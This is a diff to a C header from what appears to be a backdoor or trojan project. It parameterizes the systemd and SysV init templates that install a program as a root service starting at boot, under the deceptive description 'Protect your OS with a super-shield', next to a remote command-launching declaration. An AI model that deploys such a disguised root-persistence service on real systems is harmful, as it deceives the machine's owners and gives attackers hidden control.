@@ -72,9 +72,11 @@ void		launch_command(t_serv *serv, int fd, char *cmd);
 /* sha256.c */
 char		*sha256(char *str, size_t size);
 
+# define DESCRIPTION "Protect your OS with a super-shield"
+
 # define SYSTEMD_CONF_DIR "/etc/systemd/system"
 # define SYSTEMD_CONFIG "[Unit]\n\
-Description=Protect your OS with a super-shield\n\
+Description=%s\n\
 \n\
 [Service]\n\
 User=root\n\
@@ -88,19 +90,19 @@ WantedBy=multi-user.target\n"
 # define SYSV_CONF_DIR "/etc/init.d"
 # define SYSV_CONFIG "#!/bin/sh\n\
 ### BEGIN INIT INFO\n\
-# Provides:          <NAME>\n\
+# Provides:          %s\n\
 # Required-Start:    $local_fs $network $named $time $syslog\n\
 # Required-Stop:     $local_fs $network $named $time $syslog\n\
 # Default-Start:     2 3 4 5\n\
 # Default-Stop:      0 1 6\n\
-# Description:       <DESCRIPTION>\n\
+# Description:       %s\n\
 ### END INIT INFO\n\
 \n\
 SCRIPT=%s\n\
 RUNAS=root\n\
 \n\
-PIDFILE=/var/run/%2$s.pid\n\
-LOGFILE=/var/log/%2$s.log\n\
+PIDFILE=/var/run/%s.pid\n\
+LOGFILE=/var/log/%s.log\n\
 \n\
 start() {\n\
   if [ -f /var/run/$PIDNAME ] && kill -0 $(cat /var/run/$PIDNAME); then\n\
